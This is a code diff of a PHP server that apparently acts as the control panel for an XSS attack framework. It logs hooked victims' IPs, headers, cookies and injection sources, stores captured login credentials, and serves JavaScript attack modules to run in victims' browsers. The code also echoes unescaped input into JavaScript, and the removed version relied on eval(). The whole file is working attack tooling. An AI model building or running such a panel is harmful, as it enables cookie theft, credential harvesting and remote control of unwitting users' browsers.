@@ -1,24 +1,15 @@
 <?php 
-// TODO: get debug working
-// TODO: finish xmlhttprequest hijack
-
+// include the configuration file
 require '../config.php';
+// our log file
 $log = Logger::getLogger("app");
 
-// ensure that browsers do not cache this call
-header('Expires: Sat, 26 Jul 1997 05:00:00 GMT' );
-header('Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' );
-header('Cache-Control: no-store, no-cache, must-revalidate' );
-header('Cache-Control: post-check=0, pre-check=0', false );
-header('Pragma: no-cache' );
-header('Content-type: text/javascript');
 
 /**
  * match a useragent against a unique browser type
  */
 function match_browser($agent) {
-	$browsers = ["chrome", "firefox", "msie", "opera", "safari", "mozilla"];
-	foreach ($browsers as $b) {
+	foreach (array("chrome", "firefox", "msie", "opera", "safari", "mozilla") as $b) {
 		if (stristr($agent, $b)) { return $b; }
 	}
 	return "unknown";
@@ -28,8 +19,7 @@ function match_browser($agent) {
  * match a useragent against a unique os type
  */
 function match_os($agent) {
-	$os = ["linux", "android", "macintosh", "windows", "ipad", "iphone", "iod", "bsd"];
-	foreach ($os as $o) {
+	foreach (array("linux", "android", "macintosh", "windows", "ipad", "iphone", "iod", "bsd") as $o) {
 		if (stristr($agent, $o)) { return $o; }
 	}
 	return "unknown";
@@ -47,66 +37,83 @@ function match_os($agent) {
 function create_host($db, $guid, $cookies) {
 	$log = Logger::getLogger("app");
 	$agent = $_SERVER['HTTP_USER_AGENT'];
+	$ip = $_SERVER['REMOTE_ADDR'];
+	$headers = join(", ", apache_request_headers());
 	$os = match_os($agent);
 	$browser = match_browser($agent);
+	$cachekey ="host{$ip}{$browser}{$os}";
 
 	$log->trace("create host. agent:($agent)  match[$os : $browser]");
 
-	// reuse the host if ip, browser, os match.  then update the session guid
+	// reuse the host if ip, browser and os match.  then update the session guid
 	if (REUSE_HOST) {
-		// does the host already exist?
-		$host = $db->select("find host", "SELECT * FROM host", array("remote_ip" => $_SERVER['REMOTE_ADDR'], 'browser' => $browser, 'os' => $os));
-		// update session id and cookies
+		// try to find the host in the DB (or cache)
+		$host = cache_get($cachekey);
+		if (!$host) {
+			$host = $db->select("find host", "SELECT * FROM host", array("remote_ip" => $ip, 'browser' => $browser, 'os' => $os));
+		}
+
+		// does the host already exist? update, guid and cookies
 		if (isset($host[0])) {
-			$db->update("update host", "host", array('guid'=>$guid, 'cookies' => $cookies, 'heartbeat' => "!CURRENT_TIMESTAMP"), array("remote_ip" => $_SERVER['REMOTE_ADDR'], 'browser' => $browser, 'os' => $os));
+			// values with ! are treated as literals and are not escaped or quoted
+			$db->update("update host", "host", array('guid'=>$guid, 'cookies' => $cookies, 'heartbeat' => "!CURRENT_TIMESTAMP"), array("remote_ip" => $ip, 'browser' => $browser, 'os' => $os));
+			$host['guid'] = $guid;
+			$host['cookies'] = $cookies;
+			cache_set($cachekey, $host);
+			cache_set("guid{$guid}", $host);
 			return $host[0]['id'];
 		}
 	}
 
-	// create a new host entry
-	$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $agent, 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => $cookies, 'guid' => $guid, 'browser' => $browser, 'os' => $os, 'heartbeat' => '!CURRENT_TIMESTAMP'));
+	// does not exit, create a new host entry
+	$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $ip, 'agent' => $agent, 'headers' => $headers, 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => $cookies, 'guid' => $guid, 'browser' => $browser, 'os' => $os, 'heartbeat' => '!CURRENT_TIMESTAMP'));
 
+
+	cache_set($cachekey, array('id'=>$id, 'remote_ip'=>$ip, 'agent'=>$agent, 'headers'=>$headers, 'inject_source'=>$_SERVER['HTTP_REFERER'], 'cookies'=>$cookies, 'guid'=>$guid, 'browser'=>$browser, 'os'=>$os, 'heartbeat'=>'now'));
+
+	$res = cache_set("cmd{$guid}", true);
 	return $id;
 }
 
 /**
- * NOTE: this method is vulnerable to php code injection. Be sure to
- * protect the web interface that allows entering commands.  Placing
- * malicious commands into the web interface will result in PHP code
- * being eval().
- *
- * TODO: create a more secure method to do this
+ * Run commands for the connected browser if any exist
  */
 function run_commands($db, $guid) {
 	// do we have a command to run?
-	$rows = $db->select("check command", "SELECT * FROM commands", array("guid" => $guid));
+	$rows = cache_get("cmd{$guid}");
+	if ($rows == false)
+		$rows = $db->select("check command", "SELECT * FROM commands", array("guid" => $guid));
+
 	if (isset($rows[0])) {
 		$log = Logger::getLogger("app");
 		foreach ($rows as $row) {
 			$foo = parse_url($row['command']);
-			// convert the url to evalable php assignment
-			$a="$" . str_replace("&", "\"; $", str_replace("=", "=\"", $foo['query'])) . "\";";
 
 			// log what we are about to do
-			$log->info("run {$foo['path']} ($a)");
-			// TODO: find a better way than eval here
-			eval($a);
+			$log->info("run {$foo['path']} ({$foo['query']})");
+			
 			// .js or .php file?
 			$parts = explode(".", trim($foo["path"]));
 			$tpath = MODULE_DIR.$parts[0];
 
 			// run the module code (print out the JS)
-			if (file_exists($tpath . ".js")) {
-				// TODO: move this to a view
-				echo "var xssgbl = Array();"
-				foreach($param as $key => $val) {
-					echo "xssgbl['" + $key + "'] = $val;";
-				}
-				require($tpath . ".js");
-			}
-			if (file_exists($tpath . ".php"))
-				require($tpath . ".php");
+			if (file_exists("{$tpath}.js")) {
+				$params = get_params("{$tpath}.js");
 
+				echo "var xssgbl = Array();\n";
+				foreach($params as $name => $param) {
+
+					// set the parameter to the default
+					$val = $param[1];
+					// search for a parameter in this command
+					if (preg_match("/$name=([^&]+)/", $foo["query"], $matches)) {
+						// use the command value
+						$val = urldecode($matches[1]);
+					}
+					echo "xssgbl['$name'] = '$val';\n";
+				}
+				require("{$tpath}.js");
+			}
 
 			// don't remove autorun commands
 			if ($guid != "AUTORUN") {
@@ -117,28 +124,30 @@ function run_commands($db, $guid) {
 	}
 }
 
-function do_heartbeat() {
+function do_heartbeat($db, $guid) {
 	$log = Logger::getLogger("heartbeat");
 
-	// which host?
-	$host = $db->select("get host", "SELECT * FROM host", array("guid" => $_GET['id']));
+	// find the host
+	$host =	cache_get("guid{$guid}");
+	if (!$host)
+		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $guid));
 
 	// ensure we have a host
 	if (!isset($host[0])) {
 		$log->error("NO SUCH HOST!");
-		$id = create_host($db, $_GET['id'], "null");
+		$id = create_host($db, $guid, "null");
 		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $id));
 	}
-	// update the heqartbeat time.   TODO: web scale this shiz!
+	// update the heartbeat time.  TODO: web scale this shiz!  Needs to be cache only
 	else {
-		$db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $_GET['id']));
+		$db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $guid));
 		// add debug log
-		if (isset($_GET['d']) && strlen($_GET['d']) > 1) { $db->insert("log debug", "debug_log", array("guid" => $_GET['id'], "log" => $_GET['d'])); }
+		if (isset($guid) && strlen($_GET['d']) > 1) { $db->insert("log debug", "debug_log", array("guid" => $guid, "log" => $_GET['d'])); }
 		run_commands($db, $_GET['id']);
 		exit;
 	}
 
-	// do we have creds ?
+	// do we have login creds ?
 	// todo: move this to a module
 	if (isset($_GET['u'])) {
 		$id = $db->insert("create auth", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
@@ -146,7 +155,7 @@ function do_heartbeat() {
 	}
 }
 
-function list_hosts() {
+function list_hosts($db) {
 	$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
 	$rows2 = $db->select("get hosts", "SELECT *, 'inactive' as class FROM host", array("heartbeat < " => "!subtime(CURRENT_TIMESTAMP, '0:0:30')"));
 
@@ -177,7 +186,7 @@ try {
 
 	// heart beats. debug logs. command execution
 	if (isset($_GET['id'])) {
-		do_heartbeat();
+		do_heartbeat($db, $_GET['id']);
 	}
 
 	/******************
@@ -201,7 +210,7 @@ try {
 
 
 	if ($_GET["A"] == "list") {
-		list_hosts();
+		list_hosts($db);
 	}
 
 	if ($_GET["A"] == "exploit") { 
@@ -233,11 +242,11 @@ try {
 
 		//$rows = $db->select("get hosts", "SELECT log FROM debug_log", array("guid" => $_GET['guid']));
 		$modules = array();
-		foreach (glob("modules/*.php") as $module) {
-			$lines = file_get_contents($module);
-			preg_match("/(\$\w+)/", $lines, $matches);
-			$m = array();
+		foreach (glob(MODULE_DIR."*.js") as $module) {
+			$modules[] = get_params($module);
 		}
+		echo "module_list = " . json_encode($modules) . ";\n";
+		echo "update_modules(); xsscls();";
 	}
 	
 
@@ -245,6 +254,35 @@ try {
 	echo "<pre>";
 	debug_print_backtrace();
 	die ($e);
+}
+
+/**
+ * read the JavaScript module and return it's parameters
+ */
+function get_params($file) {
+	$lines = file_get_contents($file);
+	$parts = explode('/', $file);
+
+	preg_match_all("/xssopt\s*\(['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)/", $lines, $matches);
+	$module = array();
+
+	for($i=0,$l=count($matches[0]);$i<$l;$i++) {
+		$module[$matches[1][$i]] = array($matches[2][$i], $matches[3][$i]);
+	}
+	return $module;
+}
+
+function cache_get($key) {
+	if (CACHE == 'APC')
+		return apc_fetch($key);
+	return false;
+}
+
+function cache_set($key, $value) {
+	// cache for 10 minutes 
+	if (CACHE == 'APC')
+		return apc_store($key, $value, 600);
+	return false;
 }
 
 ?>
